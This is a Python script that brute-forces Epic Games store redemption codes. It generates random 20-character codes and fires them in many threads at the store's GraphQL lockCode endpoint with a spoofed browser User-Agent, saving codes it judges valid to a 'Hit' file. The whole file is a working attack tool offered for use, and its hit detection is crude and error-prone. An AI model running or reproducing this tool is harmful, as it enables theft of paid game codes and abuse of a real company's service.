import httpx, random, ctypes, threading, colorama, os, sys
from colorama import Fore

class MrX:
    def __init__(self):
        self.client = httpx.Client(http2=True)
        self.cpm = 0
        self.invalid = 0
        self.hit = 0
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.8",
            "x-requested-with": "XMLHttpRequest",
            "Content-Type": "application/json"
        }

    def title(self):
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"EpicGames Code Checker | Invalid: {self.invalid} | Hit: {self.hit} | CPM: {self.cpm} | Bot: {self.threads} |")

    def banner(self):
        print(f"""{Fore.LIGHTMAGENTA_EX}
                            ──────────────────▒
                            ─────────────────░█
                            ────────────────███
                            ───────────────██ღ█
                            ──────────────██ღ▒█──────▒█
                            ─────────────██ღ░▒█───────██
                            ─────────────█ღ░░ღ█──────█ღ▒█
                            ────────────█▒ღ░▒ღ░█───██░ღღ█
                            ───────────░█ღ▒░░▒ღ░████ღღღ█
                            ───░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
                            ───▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
                            ───██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
                            ───██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
                            ──██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
                            ──█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
                            ─██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
                            ─█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
                            ██ღღ▒████████████ღღ████████████░ღ█▒
                            █░ღღ████████████████████████████ღღ█
                            █▒ღ██████████████████████████████ღ█
                            ██ღღ████████████████████████████ღ██
                            ─██ღღ██████████████████████████ღ██
                            ──░██ღღ██████████████████████ღღ██
                            ────▓██ღ▒██████████████████▒ღ██
                            ───░──░███ღ▒████████████▒ღ███
                            ────░░───▒██ღღ████████▒ღ██
                            ───────────▒██ღ██████ღ██
                            ─────────────██ღ████ღ█
                            ───────────────█ღ██ღ█
                            ────────────────█ღღ█
                            ────────────────█ღ█░
                            ─────────────────██░
                                                           """)

    def request(self,key):
        self.datam = {
            "query": "mutation lockCodeMutation($codeId: String, $locale: String) {  CodeRedemption {    lockCode(codeId: $codeId, locale: $locale) {      success      data {        namespace        title        description        image        eulaIds        entitlementName        codeUseId      }    }  }}",
            "variables": {"codeId": f"{key}", "locale": "en-US"}}
        try:
            req = self.client.post("https://store.epicgames.com/graphql", follow_redirects=True, headers=self.headers, json=self.datam)
        except Exception:
            pass
        if "errors\":[{\"message" in req.text:
            f = open("Fail.txt","a")
            self.invalid += 1
            self.cpm += 1
            self.title()
            f.write(key + "\n")
            f.close()
        elif "errors\":[{\"message" not in req.text:
            ii = open("Hit.txt", "a")
            print("\n{}> {}Hit".format(Fore.YELLOW, Fore.LIGHTMAGENTA_EX))
            self.hit += 1
            self.cpm += 1
            self.title()
            ii.write(key + "\n")
            ii.close()

    def start_checking(self):
        def thread_starter():
            keys = ""
            for x in range(20):
                chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWYZX"
                keyy = random.choice(chars)
                keys += keyy
            self.request(keys)

        while True:
            try:
                if threading.active_count() <= self.threads:
                    threading.Thread(target=thread_starter, daemon=True).start()
                    self.cpm += 1
            except:
                pass
        input()

    def main(self):
        self.banner()
        self.threads = int(input("\n{}> {}[50 Bot is Better] Threads: ".format(Fore.YELLOW, Fore.WHITE)))
        os.system("cls")
        self.banner()
        print("\n{}> {}Checker Running..".format(Fore.YELLOW, Fore.LIGHTRED_EX))
        self.start_checking()

MrX().main()
